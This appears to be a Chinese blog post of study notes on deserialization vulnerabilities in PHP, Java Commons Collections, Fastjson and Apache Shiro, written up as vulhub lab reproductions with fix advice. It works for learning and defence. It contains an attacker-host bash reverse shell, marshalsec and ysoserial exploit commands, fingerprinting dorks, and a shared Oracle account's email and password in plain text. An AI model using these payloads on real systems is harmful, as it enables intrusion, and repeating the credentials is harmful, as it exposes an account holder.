
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/monster-hang/p/18759416" title="发布于 2025-03-08 15:50">
    <span role="heading" aria-level="2">10-反序列化渗透与防御</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<h1 id="1php反序列化渗透与防御">1、PHP反序列化渗透与防御</h1>
<h2 id="11-php类与对象">1.1 PHP类与对象</h2>
<p><img src="https://img2023.cnblogs.com/blog/3318828/202503/3318828-20250308154611835-1862115868.png" alt="" loading="lazy"><br>
<img src="https://img2023.cnblogs.com/blog/3318828/202503/3318828-20250308154612782-423680370.png" alt="" loading="lazy"></p>
<h2 id="12-php的magic函数">1.2 PHP的Magic函数</h2>
<p>魔术方法：满足相应的条件，会自动调用的函数(如：构造函数、析构函数等)<br>
<img src="https://img2023.cnblogs.com/blog/3318828/202503/3318828-20250308154613354-1742734154.png" alt="" loading="lazy"><br>
<img src="https://img2023.cnblogs.com/blog/3318828/202503/3318828-20250308154614783-1917822707.png" alt="" loading="lazy"></p>
<h2 id="13-php序列化和反序列化">1.3 PHP序列化和反序列化</h2>
<p>把对象转换成字符的形式储存，并存储在任何地方<br>
<img src="https://img2023.cnblogs.com/blog/3318828/202503/3318828-20250308154616242-2059630925.png" alt="" loading="lazy"></p>
<p>作用：<br>
1、对象的传输 以及 跨平台的使用<br>
2、用作缓存(Cookie、Session)</p>
<h3 id="一序列化">一、序列化</h3>
<p><mark>var_dump(serialize($obj));//输出序列化之后的结果</mark></p>
<p>其他序列化格式：<br>
1、json字符串 json_encode<br>
2、xml字符串 wddx_serialize_value<br>
3、二进制格式<br>
4、字节数组</p>
<p><mark>假如：有些敏感的变量，不想要序列化，则需要重写__sleep()方法</mark></p>
<h3 id="二反序列化">二、反序列化</h3>
<p>用unserialize将字符串，反序列化成一个对象<br>
注意：<br>
1、如果传递的字符串，格式错误 或 不可以序列化，则返回FALSE<br>
2、如果对象没有预定义，反序列化得到的对象是__PHP_Incomplete_Class</p>
<h3 id="三反序列化与magic函数">三、反序列化与Magic函数</h3>
<p><mark>php当调用反序列化方法unserialize时，会自动触发魔术方法__wakeup()或__unserialize(7.4.0)</mark></p>
<p><mark>如果类中同时定义了__unserialize()和__wakeup()两个魔术方法，则只有__unserialize()方法会生效，__wakeup()方法会被忽略</mark></p>
<h2 id="14-反序列化漏洞的出现">1.4 反序列化漏洞的出现</h2>
<p>构造payload，通过参数传递，然后通过魔术方法中的操作，达成目的</p>
<pre><code class="language-php">&lt;?php

include 'logfile.php';
$obj = new logfile();

//由于析构函数，最后会删除文件，试试能不能删除index.php
$obj-&gt;filename = 'index.php';

//序列化，将结果GET传参到网页request.php
echo serialize($obj);
</code></pre>
<p><mark>发生条件：</mark><br>
1、unserialize函数的参数可控，比如通过GET请求传参(漏洞触发点)</p>
<p>2、脚本中定义了有Magic方法，方法里面有1php文件做读写数据或者执行命令的操作，比如__destruct()、unlinke()</p>
<p>3、操作的内容需要有对象中的成员变量的值，比如filename</p>
<p>常见利用函数：(若是存在于魔术方法中，就能考虑利用)<br>
<img src="https://img2023.cnblogs.com/blog/3318828/202503/3318828-20250308154616709-1226727615.png" alt="" loading="lazy"></p>
<h2 id="15-ctf题目分析攻防世界_unserialize3">1.5 CTF题目分析(攻防世界_unserialize3)</h2>
<p><img src="https://img2023.cnblogs.com/blog/3318828/202503/3318828-20250308154617077-1245361375.png" alt="" loading="lazy"></p>
<p>观察看到一个类xctf，且存在flag成员，和__wakeup()方法<br>
但是有矛盾点，当你用code参数传入字符串，让他进行反序列化，但是会触发__wakeup()函数强行退出。</p>
<p>CVE-2016-7124(PHP5&lt;5.6.25 或 PHP7&lt;7.0.10)<br>
<mark>当构造反序列化字符串时，将xxx:2:{xxx}成员变量指定的个数，大于字符里实际的个数时，就会跳过__wakeup的执行</mark></p>
<p><mark>由于私有的成员变量会拼接类名，如Testpoc<br>
所以Testpoc要改为%00Test%00poc</mark></p>
<p>编写一段poc：</p>
<pre><code class="language-php">&lt;?php

class xctf{
public $flag = '111';
}
$a = new xctf();
echo serialize($a);
</code></pre>
<p><mark>结果：O:4:"xctf":1:{s:4:"flag";s:3:"111";}</mark></p>
<p><mark>构造payload：O:4:"xctf":2:{s:4:"flag";s:3:"111";}</mark></p>
<h2 id="16-typecho反序列化漏洞分析">1.6 typecho反序列化漏洞分析</h2>
<p>CVE-2018-18753</p>
<h1 id="2java反序列化漏洞">2、Java反序列化漏洞</h1>
<h2 id="21-基础环境">2.1 基础环境</h2>
<p>JDK解压版：包含Java运行时的环境<br>
IDEA：开发工具<br>
Maven：jar包依赖管理<br>
Tomcat：HTTP服务器<br>
Burp Suite：发送HTTP请求<br>
Kali：启动相关服务</p>
<h2 id="22-序列化和反序列化的含义和用途">2.2 序列化和反序列化的含义和用途</h2>
<p><mark>把内存中的Java对象，保存在磁盘里面 或 经过网络去传输！</mark><br>
<img src="https://img2023.cnblogs.com/blog/3318828/202503/3318828-20250308154617451-1586999530.png" alt="" loading="lazy"></p>
<p>主要使用场景：1、持久化内存数据 2、网络传输对象 3、远程方法调用(RMI)等</p>
<p><mark>php反序列化</mark><br>
<img src="https://img2023.cnblogs.com/blog/3318828/202503/3318828-20250308154618268-830638765.png" alt="" loading="lazy"></p>
<p><mark>用fastjson直接用toJSON()方法</mark><br>
<img src="https://img2023.cnblogs.com/blog/3318828/202503/3318828-20250308154618671-24006843.png" alt="" loading="lazy"></p>
<p><mark>如何存到磁盘上：会生成一个二进制文件，AC ED开头</mark><br>
<mark>其中，反序列化漏洞就存在于readObject()处</mark><br>
<img src="https://img2023.cnblogs.com/blog/3318828/202503/3318828-20250308154619516-1872378114.png" alt="" loading="lazy"><br>
<mark>注意：因为测试类 和 person类，本来就在一个依赖包</mark><br>
<mark>场景：序列化的时候有person类，但是反序列化在另一个地方没有person类</mark><br>
<mark>此时就要引入person类jar包的依赖</mark></p>
<h2 id="23-java反序列化">2.3 JAVA反序列化</h2>
<p><mark>首先！如果一个java的对象要进行序列化和反序列化，则必须实现serialize()的接口</mark><br>
<mark>其中！readObject()是可以自定义重写的</mark></p>
<h2 id="24-利用">2.4 利用</h2>
<p>思路：<br>
1、重写类的readObject()方法<br>
2、反序列过程中会执行自定义的readObject()</p>
<p>利用：有没有重写了readObject()的现成的类？<br>
package sun.reflect.annotation;<br>
AnnotationlnvocationHandler</p>
<p>package javax.management;<br>
BadAttributeValueExpException<br>
...</p>
<h1 id="3apache-commons-collections反序列化漏洞">3、Apache Commons Collections反序列化漏洞</h1>
<h2 id="31-介绍">3.1 介绍</h2>
<p><img src="https://img2023.cnblogs.com/blog/3318828/202503/3318828-20250308154619923-1235245997.png" alt="" loading="lazy"><br>
所谓Map其实就是一系列键值对，如(a,1)、(b,2),...</p>
<p>问题：<br>
1、哪里出现了可以<mark>执行任意代码</mark>的问题？<br>
2、反序列化的payload怎么构造？</p>
<p>Java代码运行原理：<br>
1、源码<br>
2、编码器(javac)编译为字节码.class文件<br>
3、各平台JVM解释器把字节码文件转换成操作系统指令<br>
跨平台 -&gt; 把同样的class文件，在不同操作系统 转换 成操作指令</p>
<h2 id="32-java反射机制">3.2 Java反射机制</h2>
<p>在程序运行的时候，<mark>动态创建一个类的实例</mark>，调用实例的方法和访问它的属性<br>
<img src="https://img2023.cnblogs.com/blog/3318828/202503/3318828-20250308154620453-1227519357.png" alt="" loading="lazy"></p>
<h2 id="33-apache-commons-collections漏洞原理--321">3.3 Apache Commons Collections漏洞原理 ≤ 3.2.1</h2>
<h3 id="一cc关键类">一、CC关键类</h3>
<p>1、InvokeTransformer<br>
利用Java反射机制来创建类实例</p>
<p>2、ChainedTransformer<br>
实现了Transformer链式调用，我们只需要传入一个Transformer数组ChainedTransformer就可以实现依次的去调用每一个Transformer的transform方法</p>
<p>3、ConstantTransformer<br>
transform()返回构造函数的对象</p>
<p>4、TransformedMap</p>
<h3 id="二调用链路">二、调用链路</h3>
<p><img src="https://img2023.cnblogs.com/blog/3318828/202503/3318828-20250308154621062-566067873.png" alt="" loading="lazy"><br>
<mark>1、首先ConstantTran的Transform方法会返回一个Runtime类的对象，InvokerTran的Transform方法会生成 三个方法，但是怎么调用他们的Transform方法呢？</mark></p>
<p><mark>2、使用ChainedTran的Transform方法，会依次调用传入的类数组中的Transform方法，但是怎么调用ChainedTran的Transform方法呢？</mark></p>
<p><mark>3、TransformedMap的格式为(Transformer,Transformer)，其中有一个checkSetValue方法，只要我们构造的一个Map的checkSetValue方法被执行了，它就会把它的键值对里的Transform方法执行</mark></p>
<p><mark>4、Ctrl+左键跟进，发现另一个Map类中有个setValue方法，且只有当一个Map对象的setValue方法被触发的时候，才会调用checkSetValue方法</mark></p>
<p><mark>5、当Map里的元素(键值对) 在增加、删除、修改的时候，Map对象的setValue方法才会被触发</mark></p>
<p><mark>6、目标：找一个对象，它在反序列化的时候，会给一个map对象的元素赋值，调用setValue方法</mark></p>
<p><mark>7、AnnotationInvocationHandler类中的反序列化函数(readObject方法)，调用了Entry var5，其实就是map var5的setValue方法</mark></p>
<h3 id="三poc构造思路">三、poc构造思路</h3>
<p>1、InvokeTransformer<br>
<mark>反射执行代码，其中的Transform方法，可以动态实例化一个类，并触发他的方法</mark></p>
<p>2、ChainedTransformer<br>
链式调用，自动触发</p>
<p>3、ConstantTransformer<br>
获得对象</p>
<p>4、TransformedMap<br>
元素变化执行transform, setValue----checkSetValue</p>
<p>5、AnnotationInvocationHandler<br>
readObject调用Map的setValue</p>
<h3 id="四调用流程"><mark>四、调用流程</mark></h3>
<p>前提是，受害者提供了一个反序列化的接口<br>
1、对利用类AnnotationInvocationHandler进行序列化，然后交给Java程序反序列化</p>
<p>2、在进行反序列化时，会执行readObject()方法，其中会调用map的setvalue方法，该方法会用setValue对成员变量TransformedMap的Value值进行修改</p>
<p>3、value修改触发了TransformedMap实例化时传入的参数InvokeTransformer的checkSetValue----transform()方法</p>
<p>4、放到Map里面的是InvokeTransformer数组，transform()方法被依次调用</p>
<p>5、InvokeTransformer.transform()方法通过反射，调用Runtime.getRuntime.exex("xx")函数来执行系统命令</p>
<h1 id="4fastjson反序列化漏洞阿里巴巴">4、Fastjson反序列化漏洞(阿里巴巴)</h1>
<p><a href="https://github.com/orgs/alibaba/repositories" target="_blank" rel="noopener nofollow">Alibaba开源系列</a><br>
Druid、Fastjson、Dubbo、OceanBase、Tengine、TFS、RocketMQ、Canal</p>
<p><a href="https://github.com/alibaba/fastjson/wiki/Quick-Start-CN" target="_blank" rel="noopener nofollow">Fastjson</a><br>
速度快、使用广泛、测试完备、使用简单、功能完备</p>
<h2 id="41-fastjson介绍">4.1 Fastjson介绍</h2>
<h3 id="一结论"><mark>一、结论：</mark></h3>
<p>get方法 和 set方法，当你的私有变量不想让别人直接访问 User.name，则封装一个接口函数，间接调用。</p>
<p>1、序列化的时候，会调用成员变量的get方法，拿到它的值，然后写入到序列化的字符串里面，私有成员变量不会被序列化。</p>
<p>2、<mark>反序列化的时候，会调用成员变量的set方法</mark>，把字符串 赋值 给对象，public修饰的成员全部自动赋值</p>
<h3 id="二反序列化方法"><mark>二、反序列化方法</mark></h3>
<p>JSON.parseObject() 返回实际类型对象，参数确定类 #推荐使用<br>
User user1 = JSON.parseObject(serializedStr, User.class);</p>
<p>JSON.parse() 返回JsonObject对象，再通过强制类型转换，确定类<br>
Object obj1 = JSON.parse(serializedStr)</p>
<h3 id="三type-自省-autotype">三、@type 自省 Autotype</h3>
<p><mark>Fastjson序列化的时候，默认是不包含类名的！所以反序列化的时候，要给他一个类名</mark><br>
<img src="https://img2023.cnblogs.com/blog/3318828/202503/3318828-20250308154622582-165012370.png" alt="" loading="lazy"></p>
<p>用法一：通过@type关键字，把类名写在字符串中，此时反序列化JSON.parseObject()可以不加参数User.class</p>
<p><mark>用法二：子类中包含接口(interface) 或 抽象类(abstract class)的时候，类型丢失，则需要使用@type</mark></p>
<h3 id="四利用类">四、利用类</h3>
<p>找到com.sun.rowset.JdbcRowSetlmpl类，并且让fastJson反序列化它</p>
<p>Jdbc是一个连接数据库的类，你去反序列化它的时候，会连接一个数据源dataSource，可以是rmi或者是ldap源，黑客会把恶意代码挂在rmi源上面，他会下载这个代码，攻击就发生了<br>
<img src="https://img2023.cnblogs.com/blog/3318828/202503/3318828-20250308154623515-1191712073.png" alt="" loading="lazy"></p>
<p><mark>主要流程：反序列化，让Jdbc的这个类，去连接LDAP服务器中不存在的文件，然后下载恶意脚本</mark></p>
<h2 id="42-fastjson-1224-rce-cve-2017-18349">4.2 fastjson-1.2.24 RCE CVE-2017-18349</h2>
<h3 id="零漏洞原理"><mark>零、漏洞原理：</mark></h3>
<p><mark>利用流程</mark><br>
1、序列化字符准备类名、dataSourceName属性和autoCommit属性<br>
由于反序列化的时候，会调用set方法<br>
分别调用setdataSourceName 和 setautoCommit 方法<br>
2、JdbcRowSetlmpl反序列化，调用jdbcRowSetlmpl的setAutoCommit()<br>
3、setAutoCommit()调用connect()<br>
4、connect()调用lookup()连接到LDAP/RMI服务器<br>
5、下载恶意代码到本地，执行，攻击发生<br>
<img src="https://img2023.cnblogs.com/blog/3318828/202503/3318828-20250308154629118-8541509.png" alt="" loading="lazy"></p>
<h3 id="一提前准备">一、提前准备：</h3>
<p>1、vulhub启动靶场<br>
2、Kali用marshalsec启动LDAP/RMI服务<br>
3、Kali用python启动HTTP服务，存放恶意类<br>
4、Kali用netcat监听端口，建立反弹连接<br>
注：可以结合Log4j2的JNDI注入学习</p>
<h3 id="二启动靶场centos7">二、启动靶场Centos7：</h3>
<p>cd /usr/local/soft/vulhub/fastjson/1.2.24-rce<br>
docker-compose up -d</p>
<h3 id="三启动攻击机kali">三、启动攻击机Kali：</h3>
<p>1、设置python版本:<br>
配置<br>
update-alternatives --install /usr/bin/python python /usr/bin/python2 100<br>
update-alternatives --install /usr/bin/python python /usr/bin/python3 150</p>
<p>切换版本<br>
update-alternatives --config python</p>
<p>2、设置JRE版本为jdk 1.8<br>
<a href="https://www.oracle.com/java/technologies/downloads/#java8" target="_blank" rel="noopener nofollow">JDK8官网oracle下载</a><br>
/<em>注意，Oracle 的账号规定了只能单点登录，如果有两个人同时登录这个账号是行不通的。</em>/<br>
账号：awo81898@tuofs.com<br>
密码：Fs123456</p>
<p>解压：tar -zxvf xxx.tar.gz<br>
或：gzip -dv xxx.tar.gz; tar -xvf xxx.tar</p>
<p><mark>vim /etc/profile</mark><br>
在文件末尾添加<br>
# java<br>
export JAVA_HOME=/root/soft/java/jdk1.8.0_441<br>
export PATH=$JAVA_HOME/bin:$PATH<br>
export CLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib<br>
重新加载配置文件<br>
<mark>source /etc/profile</mark></p>
<h3 id="四环境">四、环境</h3>
<p>编写恶意代码LinuxTouch，编译为class；编译完成后，这个恶意类要放在网上，给LDAP服务器去关联+下载</p>
<p>启动http服务：python -m http.server 8090 #python3</p>
<p>启动RMI服务：java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "<a href="http://xxx.xxx.xxx.xxx:8090/#LinuxTouch" target="_blank" rel="noopener nofollow">http://xxx.xxx.xxx.xxx:8090/#LinuxTouch</a>" 9473</p>
<h3 id="五攻击步骤-及-脚本">五、攻击步骤 及 脚本</h3>
<p>1、将脚本放到对应的java版本包的bin目录下，然后执行javac。<br>
<mark>注意：不能有包名package字样</mark><br>
<img src="https://img2023.cnblogs.com/blog/3318828/202503/3318828-20250308154628531-1756623507.png" alt="" loading="lazy"></p>
<p>2、将生成的class文件，放到kali开启的http服务下(vulhub/apache)</p>
<p>3、开启LDAP服务(marshalsec)</p>
<p>4、开启vulhub靶机，该网页会反序列化提交的请求</p>
<p>5、打开burpsuite，编写并发送payload<br>
<img src="https://img2023.cnblogs.com/blog/3318828/202503/3318828-20250308154629118-8541509.png" alt="" loading="lazy"></p>
<h3 id="复现不成功的几种原因">复现不成功的几种原因</h3>
<p>1、JDK11编译的class放到靶场JDK8的环境，不能运行<br>
2、java源代码不能有包名（package name）<br>
3、用python启动HTTP而不是Apache<br>
4、docker-compose up 不带-d可以看到日志</p>
<h2 id="42-fastjson-1247-rce-cve-2017-18349">4.2 fastjson-1.2.47 RCE CVE-2017-18349</h2>
<h3 id="零漏洞原理-1"><mark>零、漏洞原理</mark></h3>
<p><mark>黑名单绕过。利用缓存的机制。</mark><br>
通过再java.lang.Class类，这个类是去找一个名字。<br>
如果在缓存中找到JdbcRowSetlmpl类，就可以拿到<br>
<img src="https://img2023.cnblogs.com/blog/3318828/202503/3318828-20250308154632099-880842352.png" alt="" loading="lazy"></p>
<h3 id="一环境">一、环境</h3>
<p>Kali监听9001的端口：nc -lvp 9001</p>
<p>编写恶意代码LinuxRevers，编译为class；编译完成后，这个恶意类要放在网上，给LDAP服务器去关联+下载</p>
<p>启动http服务：python -m http.server 8090 #python3</p>
<p>启动LDAP服务：java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "<a href="http://xxx.xxx.xxx.xxx:8090/#LinuxRevers" target="_blank" rel="noopener nofollow">http://xxx.xxx.xxx.xxx:8090/#LinuxRevers</a>" 9473</p>
<h3 id="二攻击步骤-及-脚本">二、攻击步骤 及 脚本</h3>
<p><img src="https://img2023.cnblogs.com/blog/3318828/202503/3318828-20250308154631338-969091400.png" alt="" loading="lazy"><br>
<img src="https://img2023.cnblogs.com/blog/3318828/202503/3318828-20250308154632099-880842352.png" alt="" loading="lazy"></p>
<h2 id="43-漏洞挖掘思路">4.3 漏洞挖掘思路</h2>
<p>1、找到发送JSON序列化数据的端口<br>
2、判断是否使用fastjson</p>
<pre><code>一、非法格式报错
{"x":"
二、使用dnslog探测
{"x":{"@type":"java.net.lnet4Address","val":"xxx.dnslog.cn"}}
</code></pre>
<p>3、Burp插件<br>
<a href="https://github.com/zilong3033/fastjsonScan" target="_blank" rel="noopener nofollow">https://github.com/zilong3033/fastjsonScan</a></p>
<h2 id="44-漏洞修复">4.4 漏洞修复</h2>
<p>1、升级JDK<br>
6u211 / 7u201 / 8u191 / 11.0.1</p>
<p>2、升级Fastjson到最新版<br>
fastjson.parser.safeMode=true</p>
<p>3、使用安全产品过滤非法内容</p>
<p>4、更换其他序列化工具<br>
Jackson/Gson</p>
<h1 id="5shiro反序列化漏洞">5、Shiro反序列化漏洞</h1>
<h2 id="51-apache-shiro反序列化漏洞shiro550">5.1 Apache Shiro反序列化漏洞（Shiro550）</h2>
<h3 id="一shiro介绍">一、Shiro介绍</h3>
<p>Apache Shiro：开源安全框架</p>
<ul>
<li>身份认证（登录）</li>
<li>授权（访问控制）</li>
<li>会话管理（如session）</li>
<li>加密</li>
</ul>
<p><img src="https://img2023.cnblogs.com/blog/3318828/202503/3318828-20250308154633279-610207853.png" alt="" loading="lazy"></p>
<h2 id="52-漏洞原因分析">5.2 漏洞原因分析</h2>
<p>该反序列化漏洞，发生在网页的登录过程中发生的，在"记住我"功能中<br>
登陆验证流程</p>
<h3 id="一登陆信息保存">一、登陆信息保存</h3>
<p>1、remember me登录：<br>
序列化——AES加密——Base64编码——写入Cookie<br>
在服务器的session中保存起来，并且发给客户端</p>
<p>2、身份认证：<br>
Cookie值——Base64解码——AES解密——<mark>反序列化</mark></p>
<p>难点1：AES加密需要同一把密钥，怎么找到服务器里用来解密的key呢？<br>
答案：在Shiro550中，AES加密是硬编码，即在代码里写死了，任何人可见</p>
<p>难点2：完整调用链？怎么通过反序列化到readobject方法，去执行命令呢？<br>
答案：使用工具!</p>
<h3 id="二登录过程">二、登录过程</h3>
<p><img src="https://img2023.cnblogs.com/blog/3318828/202503/3318828-20250308154634073-1532442182.png" alt="" loading="lazy"></p>
<h3 id="三验证过程">三、验证过程</h3>
<p><img src="https://img2023.cnblogs.com/blog/3318828/202503/3318828-20250308154636413-359540594.png" alt="" loading="lazy"></p>
<h2 id="53-漏洞环境搭建">5.3 漏洞环境搭建</h2>
<p>本地复现 或 vulhub复现</p>
<p>1、本地代码<br>
<a href="https://github.com/apache/shiro/releases/tag/shiro-root-1.2.4" target="_blank" rel="noopener nofollow">https://github.com/apache/shiro/releases/tag/shiro-root-1.2.4</a><br>
2、IDEA导入到以下目录<br>
shiro-shiro-root-1.2.4\samples\web<br>
3、pom.xml修改，还需要apachecc依赖<br>
<img src="https://img2023.cnblogs.com/blog/3318828/202503/3318828-20250308154639179-1838301036.png" alt="" loading="lazy"><br>
4、安装ysoserial-jar依赖包</p>
<p>勾选remember me，使用任意用户名密码进行登录（Burp抓包）</p>
<h2 id="54-利用工具和方式">5.4 利用工具和方式</h2>
<h3 id="一jrmp协议服务器">一、JRMP协议/服务器</h3>
<p>JRMP全称为Java Remote Methmod Protocol，也就是Java远程方法协议<br>
他是RMI工作的一个底层协议。</p>
<h3 id="二ysoserial工具">二、ysoserial工具</h3>
<p><a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener nofollow">https://github.com/frohoff/ysoserial</a></p>
<p>在终端运行：mvn package -D skip Tests，进行编译打包<br>
或者，上github找已经打包好的ysoserial.jar文件</p>
<p><mark>java -cp ysoserial.jar ysoserial.exploit.JRMPListener 7777 CommonsCollections1 'calc.exe'</mark></p>
<p>POP Gadgets（Property-Oriented Programming 面向属性编程）<br>
可以检测是否存在java反序列化漏洞，并进行验证和利用</p>
<h3 id="三漏洞特征">三、漏洞特征</h3>
<p>set-cookie是否存在rememberMe=deleteMe</p>
<p>fofa dork<br>
<mark>header="rememberme=deleteMe"、header="shiroCookie"</mark></p>
<h3 id="四检测工具">四、检测工具</h3>
<p>基于JDK8<br>
1、shiro_tool.jar 纯字符版<br>
2、ShiroExploitV2.51<br>
3、shiro_attach-v2.0.jar</p>
<h2 id="55-利用方式1">5.5 利用方式1</h2>
<p>payloads/JRMPListener &lt;&gt; exploit/JRMPClient<br>
<img src="https://img2023.cnblogs.com/blog/3318828/202503/3318828-20250308154640430-79137328.png" alt="" loading="lazy"></p>
<h2 id="56-利用方式2本次实验">5.6 利用方式2（本次实验）</h2>
<p>exploit/JRMPListener &lt;&gt; payloads/JRMPClient<br>
两次反序列化<br>
<img src="https://img2023.cnblogs.com/blog/3318828/202503/3318828-20250308154643270-1589002234.png" alt="" loading="lazy"></p>
<p>参考资料：<br>
<a href="https://www.sohu.com/a/447023879_120045376" target="_blank" rel="noopener nofollow">https://www.sohu.com/a/447023879_120045376</a><br>
<a href="http://t.zoukankan.com/nice0e3-p-14280278.html" target="_blank" rel="noopener nofollow">http://t.zoukankan.com/nice0e3-p-14280278.html</a></p>
<h3 id="一利用流程"><mark>一、利用流程</mark></h3>
<p>1、先构建一个恶意命令，它的作用是让漏洞服务器连接到我们启动的JRMP服务器，建立一个通道，方便我们发送payload1<br>
2、把这个命令序列化、AES加密、base64编码(payload2)，写入Cookie，发送给漏洞服务器<br>
3、漏洞服务器：base64解码、AES解密、反序列化，执行恶意命令，连接到JRMP服务器<br>
4、继续发送恶意payload1，利用CC等通过库的漏洞执行命令</p>
<h3 id="二完整流程"><mark>二、完整流程</mark></h3>
<p><img src="https://img2023.cnblogs.com/blog/3318828/202503/3318828-20250308154646005-474755476.png" alt="" loading="lazy"></p>
<p>第一步：<br>
kali监听端口：nc -lvp 7777</p>
<p>第二步：<br>
准备恶意命令，反弹连接命令作为ysoserial参数，在进行编码处理<br>
bash -i &gt;&amp; /dev/tcp/Kali的ip/7777 0&gt;&amp;1<br>
base64编码+改变格式<br>
ysoserial编码工具：<a href="https://ares-x.com/tools/runtime-exec/" target="_blank" rel="noopener nofollow">https://ares-x.com/tools/runtime-exec/</a></p>
<p>第三步：启动JRMPListener<br>
通过ysoserial的jar包<br>
java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 8888 CommonsCollections5 "反弹连接格式"</p>
<p>第四步：python生成cookie（AES加密、base64）<br>
python shiro.py xxx.xxx:8888指定JRMP端口<br>
pip install pycrypto模块<br>
<img src="https://img2023.cnblogs.com/blog/3318828/202503/3318828-20250308154647676-1386660058.png" alt="" loading="lazy"></p>
<p>第五步：通过BP，发送cookie值<br>
<img src="https://img2023.cnblogs.com/blog/3318828/202503/3318828-20250308154649111-1602367590.png" alt="" loading="lazy"></p>
<p>第六步：成功！<br>
我只发了一次payload，目的是为了连接JRMP服务器。<br>
实际上第二个payload，是ysoserial发送的，包括反弹连接+反序列化</p>
<h2 id="57-修复和防御">5.7 修复和防御</h2>
<p>1、升级Apache Shiro到最新版本<br>
2、部署安全产品</p>
<p>防御工具库：<br>
<a href="https://github.com/ikkisoft/SerialKiller/" target="_blank" rel="noopener nofollow">https://github.com/ikkisoft/SerialKiller/</a></p>
<h1 id="6总计">6、总计！</h1>
<p><img src="https://img2023.cnblogs.com/blog/3318828/202503/3318828-20250308154650983-359228462.png" alt="" loading="lazy"><br>
<img src="https://img2023.cnblogs.com/blog/3318828/202503/3318828-20250308154651443-1175895786.png" alt="" loading="lazy"><br>
<img src="https://img2023.cnblogs.com/blog/3318828/202503/3318828-20250308154651919-1937340633.png" alt="" loading="lazy"><br>
<img src="https://img2023.cnblogs.com/blog/3318828/202503/3318828-20250308154652498-26459907.png" alt="" loading="lazy"><br>
<img src="https://img2023.cnblogs.com/blog/3318828/202503/3318828-20250308154653083-1432683297.png" alt="" loading="lazy"><br>
<img src="https://img2023.cnblogs.com/blog/3318828/202503/3318828-20250308154653551-185014216.png" alt="" loading="lazy"><br>
<img src="https://img2023.cnblogs.com/blog/3318828/202503/3318828-20250308154653930-69162625.png" alt="" loading="lazy"><br>
<img src="https://img2023.cnblogs.com/blog/3318828/202503/3318828-20250308154654780-1728020158.png" alt="" loading="lazy"></p>

</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0.018467245675925927" data-date-created="BlogServer.Application.Dto.BlogPost.BlogPostDto" data-date-updated="2025-03-08 15:50">2025-03-08 15:50</span>&nbsp;
<a href="https://www.cnblogs.com/monster-hang">xmh666</a>&nbsp;
阅读(<span id="post_view_count">0</span>)&nbsp;
评论(<span id="post_comment_count">0</span>)&nbsp;
<a href="https://i.cnblogs.com/EditPosts.aspx?postid=18759416" rel="nofollow">编辑</a>&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(18759416);return false;">收藏</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '18759416', targetLink: 'https://www.cnblogs.com/monster-hang/p/18759416', title: '10-反序列化渗透与防御' })">举报</a>
</div>
        